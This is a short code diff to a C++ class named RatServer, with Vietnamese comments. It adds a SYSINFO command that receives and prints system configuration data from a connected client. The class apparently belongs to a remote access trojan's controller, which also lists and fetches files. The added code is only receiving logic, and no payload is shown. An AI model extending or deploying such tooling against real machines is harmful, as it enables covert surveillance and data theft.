@@ -255,6 +255,9 @@ void RatServer::HandleCommand(const std::string& input) {
         std::string filename = input.substr(9);
         SendFileContent(filename);
     }
+    else if (input == "SYSINFO") { // Thêm nhánh xử lý phản hồi lệnh SYSINFO
+        SysInfo();
+    }
 }
 
 void RatServer::ListFile() {
@@ -333,6 +336,20 @@ void RatServer::ReceiveStatus() {
         std::cout << "[-] Khong nhan duoc phan hoi tu Client.\n";
     else {
         std::cout << "[*] Ket qua tu Client: " << response;
+    }
+}
+
+void RatServer::SysInfo() {
+    std::cout << "[*] Dang tai thong tin cau hinh tu Client..." << std::endl;
+            
+    // Đặt timeout ngắn (1 giây) để đảm bảo nhận hết gói tin văn bản thông tin
+    DWORD timeout = 1000; 
+
+    auto sysInfoResult = client.ReceiveUntilTimeout(timeout);
+    if (!sysInfoResult.empty()) {
+        std::cout << sysInfoResult << std::endl;
+    } else {
+        std::cout << "[-] Khong nhan duoc du lieu phan hoi.\n";
     }
 }
 
